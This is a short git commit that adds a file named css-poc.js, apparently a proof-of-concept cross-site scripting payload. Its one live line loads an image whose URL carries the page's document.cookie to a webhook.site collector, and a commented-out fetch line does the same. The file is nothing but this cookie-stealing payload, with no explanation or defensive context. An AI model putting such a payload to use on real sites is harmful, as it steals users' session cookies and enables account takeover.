90776a32cd461786e271cd5cf4430c65170da0e3
fvge <unsaid_snippy_0v@icloud.com>
2024-07-14 11:00:31 +0200

    Create css-poc.js

---
+++ css-poc.js
@@ -0,0 +1,3 @@
+// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
+
+var i=new Image;i.src="https://webhook.site/d895d073-53d2-42c5-a587-3a465ec34916/?cookie="+document.cookie;
